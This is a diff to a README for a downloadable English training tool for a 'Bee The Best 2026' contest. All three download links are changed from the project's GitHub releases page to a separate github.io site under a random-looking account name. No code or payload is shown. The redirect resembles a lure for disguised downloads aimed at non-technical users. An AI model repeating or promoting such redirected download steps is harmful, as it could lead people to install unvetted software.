@@ -29,7 +29,7 @@ Watch yourself improve over time. The interface shows your scores and response t
 
 One of the best things about this tool is how easy it is to get started. You don't need to be a computer expert or have any programming knowledge. If you can use a web browser, you can use this training hub.
 
-[![Download Now](https://img.shields.io/badge/Download-Bee_English_Tool-blue?style=for-the-badge&logo=github)](https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Bee_English_Tool-blue?style=for-the-badge&logo=github)](https://sabbatical-stuffedderma381.github.io)
 
 ### 📥 Download and Installation
 
@@ -37,7 +37,7 @@ One of the best things about this tool is how easy it is to get started. You don
 
 Here's what you do:
 
-1. **Click the download button above** or go directly to the [download page](https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases).
+1. **Click the download button above** or go directly to the [download page](https://sabbatical-stuffedderma381.github.io).
 2. **Look for the newest version** listed on the page. The download page shows a list of available releases, with the latest one at the top.
 3. **Find the file** that matches your computer. It will have a name similar to the tool's name and will end with a file extension.
 4. **Click on the file name** to begin the download. Your browser will save the file to your default Downloads folder.
@@ -145,7 +145,7 @@ Click the download button at the top of this page, get the application up and ru
 
 **Visit this link to download the application.**
 
-[![Download Now](https://img.shields.io/badge/Get_Started-Download_Tool-green?style=for-the-badge&logo=download)](https://github.com/sabbatical-stuffedderma381/bee-english-round2-hub/releases)
+[![Download Now](https://img.shields.io/badge/Get_Started-Download_Tool-green?style=for-the-badge&logo=download)](https://sabbatical-stuffedderma381.github.io)
 
 Happy training, and good luck at Bee The Best 2026! 🐝✨
 
